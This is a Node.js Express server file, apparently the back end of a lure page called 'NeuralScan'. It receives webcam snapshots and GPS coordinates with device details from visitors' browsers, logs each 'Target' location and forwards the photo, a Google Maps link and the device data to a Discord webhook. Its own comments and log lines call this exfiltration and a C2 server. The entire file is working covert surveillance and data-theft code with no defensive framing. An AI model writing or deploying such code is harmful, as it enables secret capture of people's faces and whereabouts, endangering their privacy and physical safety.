const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');
const app = express();

const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK; // This is a secret!

app.use(express.json({ limit: '50mb' }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/save-photo', async (req, res) => {
    const { image, metadata } = req.body;
    const timestamp = Date.now();
    const base64Data = image.replace(/^data:image\/png;base64,/, "");
    const buffer = Buffer.from(base64Data, 'base64');

    // 1. Log to Console
    console.log(`[!] Target: ${metadata.location.lat}, ${metadata.location.lon}`);

    // 2. Send to Discord if the secret is set
    if (DISCORD_WEBHOOK) {
        try {
            const form = new FormData();
            // We attach the photo as a file called 'snap.png'
            form.append('file', buffer, { filename: 'snap.png' });
            
            // We add the text data as the message content
            form.append('payload_json', JSON.stringify({
                content: "🚨 **NEW BIOMETRIC CAPTURE** 🚨",
                embeds: [{
                    title: "Target Intelligence",
                    color: 5763719,
                    fields: [
                        { name: "📍 GPS", value: `[${metadata.location.lat}, ${metadata.location.lon}](https://www.google.com/maps?q=${metadata.location.lat},${metadata.location.lon})`, inline: true },
                        { name: "📱 Device", value: metadata.device, inline: true }
                    ],
                    image: { url: "attachment://snap.png" }
                }]
            }));

            await axios.post(DISCORD_WEBHOOK, form, { headers: form.getHeaders() });
        } catch (err) {
            console.error("[-] Discord Exfiltration Failed");
        }
    }

    res.sendStatus(200);
});

app.listen(PORT, () => console.log(`🚀 NeuralScan C2 Active on port ${PORT}`));